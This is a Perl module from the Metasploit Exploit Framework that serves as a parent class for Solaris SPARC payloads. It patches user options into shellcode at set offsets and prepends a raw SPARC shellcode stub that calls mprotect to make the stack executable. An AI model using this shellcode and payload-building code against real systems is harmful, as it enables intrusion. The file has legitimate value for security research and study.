
###############

##
#         Name: SolarisPayload.pm
#       Author: H D Moore <hdm [at] metasploit.com>
#       Author: optyx <optyx [at] uberhax0r.net>
#      Version: $Revision$
#  Description: Parent class for Solaris (sparc) payloads.
#      License:
#
#      This file is part of the Metasploit Exploit Framework
#      and is subject to the same licenses and copyrights as
#      the rest of this package.
#
##

package Msf::PayloadComponent::SolarisPayload;
use strict;
use base 'Msf::Payload';
use Pex::Utils;
use vars qw{@ISA};

sub _Import {
  my $class = shift;
  @ISA = ('Msf::Payload');
  foreach (@_) {
    eval("use $_");
    unshift(@ISA, $_);
  }
}

sub new {
    my $class = shift;
    my $hash = @_ ? shift : { };
    my $self = $class->SUPER::new($hash);
    $self->InitSolaris;
    return($self);
}

# XXX - Solaris payloads are disabled for now, there are still some
# problems with the stage shell and we simply ran out of time
# to resolve them before release.
sub Loadable {
	my $self = shift; 
    return $self->GetVar('SolarisDebug') ? 1 : undef;
}

sub InitSolaris {
    my $self = shift;
    $self->{'Info'}->{'UserOpts'}->{'FIXSTACK'} = [1, 'BOOL', 'Call mprotect to make the stack executable', 1];
}

sub SolarisPayload {
  my $self = shift;
  return($self->_Info->{'SolarisPayload'});
}

sub Size {
    my $self = shift;
    my $size = length($self->Build);
    $self->PrintDebugLine(3, "SolarisPayload: returning Size of $size");
    return $size;
}

sub Build {
  my $self = shift;
  return($self->BuildSolaris($self->SolarisPayload));
}

sub BuildSolaris {
    my $self = shift;
    my $solarisHash = shift;
    my $payload  = $solarisHash->{'Payload'};
    my $generated = $payload;    

    my $opts = $solarisHash->{'Offsets'};
    
    foreach my $opt (keys(%{ $opts })) {
        next if $opt eq 'FIXSTACK';
        
        my ($offset, $opack) = @{ $solarisHash->{'Offsets'}->{$opt} };
        my $type = $opts->{$opt}->[1];    
        
        $self->PrintDebugLine(3, "SolarisPayload: opt=$opt type=$type");   
        if (my $val = $self->GetVar($opt)) {
            $self->PrintDebugLine(3, "SolarisPayload: opt=$opt type=$type val=$val");      
            $val = ($type eq 'ADDR') ? gethostbyname($val) : pack($opack, $val);
            substr($generated, $offset, length($val), $val); 
        }
    }
   
    if ($self->GetVar('FIXSTACK')) {
    	$generated = $self->FixStack . $generated;
    }
    return $generated;
}

sub FixStack {
	my $self = shift;
    my $code =
        "\x90\x2b\xaf\xff".     # andn         %sp, 4095, %o0
        "\x94\x10\x20\x07".     # mov          7, %o2
        "\x92\x10\x20\x0f".     # mov          15, %o1
        "\x93\x2a\x60\x1c".     # sll          %o1, 28, %o1
        "\x92\x22\x40\x08".     # sub          %o1, %o0, %o1
        "\x82\x10\x20\x74".     # mov          116, %g1
        "\x91\xd0\x20\x08";     # ta           0x8
		
	return $code;
}

1;
